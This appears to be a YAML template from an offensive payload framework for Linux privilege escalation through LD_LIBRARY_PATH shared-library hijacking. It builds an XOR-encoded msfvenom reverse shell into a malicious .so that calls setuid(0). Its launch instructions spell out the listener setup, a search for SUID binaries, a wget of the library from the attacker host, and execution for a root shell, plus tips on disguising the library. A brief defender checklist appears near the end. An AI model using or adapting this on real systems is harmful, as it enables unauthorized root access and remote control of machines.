meta:
  name: "Linux LD_LIBRARY_PATH Shared Library Hijacking (C)"
  category: "Persistence"
  description: |
    Shared library hijacking via LD_LIBRARY_PATH for privilege escalation on Linux.
    
    Features:
    - Creates malicious version of target library
    - Uses constructor attribute for automatic execution
    - XOR-encrypted shellcode (key: 0xfa)
    - Attempts setuid(0)/setgid(0) for privilege escalation
    - Executes before main() via __attribute__((constructor))
    
    This technique exploits programs with SUID bit that use dynamic libraries.
    By placing a malicious library in a directory specified by LD_LIBRARY_PATH,
    you can execute code when the SUID binary loads the library.
    
    WARNING: For authorized security testing only!

  effectiveness: "medium"

  mitre:
    tactic: "TA0004 - Privilege Escalation"
    technique: "T1574.007 - Hijack Execution Flow: Path Interception by PATH Environment Variable"

  artifacts:
    - "Malicious shared library (.so file)"
    - "LD_LIBRARY_PATH environment variable set"
    - "Constructor function execution before main()"
    - "setuid(0)/setgid(0) privilege escalation attempts"
    - "mprotect() calls to make memory executable"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker/C2 server IP address for reverse connection"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port on attacker machine"
    required: true
    default: 443

  - name: "xor_key"
    type: "hex"
    description: "XOR encryption key (single byte, e.g., 'fa')"
    required: false
    default: fa

  - name: "target_library"
    type: "string"
    description: "Name of library to hijack (e.g., 'gpgrt' for libgpgrt.so)"
    required: true
    default: "gpgrt"

  - name: "output_file"
    type: "string"
    description: "Output shared library filename (will be prefixed with 'lib' and suffixed with '.so')"
    required: false
    default: "libhijack.so"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode using msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
    output_var: "raw_shellcode"

  # Step 2: XOR encrypt the shellcode
  - type: "script"
    name: "xor_encryption"
    script: "xor_encrypt.py"
    args:
      data: "{{ raw_shellcode }}"
      key: "{{ xor_key }}"
    output_var: "xor_result"

  # Step 3: Format encrypted shellcode as C byte array
  - type: "script"
    name: "format_payload"
    script: "format_c.py"
    args:
      data: "{{ xor_result.encrypted }}"
      var_name: "buf"
      bytes_per_line: 15
    output_var: "c_payload"

output:
  type: "template"
  template: "persistence/ld_library_path.c"
  compile:
    enabled: true
    command: "gcc -Wall -fPIC -z execstack -shared -o {{ output_path }}/lib{{ target_library }}.so {{ source_file }} -ldl"
  launch_instructions: |
    C Linux LD_LIBRARY_PATH Shared Library Hijacking - Launch Instructions

    Start Listener:
    nc -lvnp {{ lport }}

    Or with Metasploit:
    msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"

    Find SUID Binaries:
    find / -perm -u=s -type f 2>/dev/null
    for i in $(find / -perm -u=s -type f 2>/dev/null); do ldd $i 2>/dev/null | grep -q "{{ target_library }}" && echo $i; done

    Transfer and Execute:
    python3 -m http.server 8080
    On target: mkdir -p /tmp/lib && wget http://{{ lhost }}:8080/lib{{ target_library }}.so -O /tmp/lib/lib{{ target_library }}.so && chmod +x /tmp/lib/lib{{ target_library }}.so && export LD_LIBRARY_PATH=/tmp/lib:$LD_LIBRARY_PATH && /path/to/suid_binary

    Notes:
    - Target library: {{ target_library }} (must be loaded by SUID binary)
    - XOR encrypted with key: 0x{{ xor_key }}
    - Uses __attribute__((constructor)) for auto-execution before main()
    - setuid(0)/setgid(0) escalates to root
    - Reverse shell connects to {{ lhost }}:{{ lport }} with root privileges
    - Works on x64 Linux systems
    - Some systems ignore LD_LIBRARY_PATH for SUID binaries (security feature - check secure-mode)
    - Common target libs: libgpgrt.so, libcrypto.so, libz.so, libpthread.so
    - Alternative: RPATH injection if binary has writable RPATH (check: readelf -d /binary | grep RPATH)
    - Name library identically to legitimate one, match version numbers (libfoo.so.1.2.3)

    Troubleshooting:
    - Library not loaded: SUID binary may ignore LD_LIBRARY_PATH in secure mode
    - No privilege escalation: setuid() fails if not SUID binary or SELinux/AppArmor blocks
    - Symbol not found: Add stub functions matching target library (use objdump/nm to identify)
    - No execution: Verify SUID binary actually loads target library with `ldd /path/to/suid_binary`
    - Check /proc/self/maps after hijack to verify library loaded from /tmp/lib

    Cleanup:
    On target:
    rm -f /tmp/lib/lib{{ target_library }}.so
    unset LD_LIBRARY_PATH

    Defenders can detect this via:
    - Monitor LD_LIBRARY_PATH in process environment
    - Check for libraries loaded from unusual paths
    - Audit SUID binaries and their library dependencies
    - lsof to see which libraries are loaded

    Cleanup:

    Remove environment variable:
    unset LD_LIBRARY_PATH

    Remove library:
    rm /tmp/lib/lib{{ target_library }}.so
    rmdir /tmp/lib
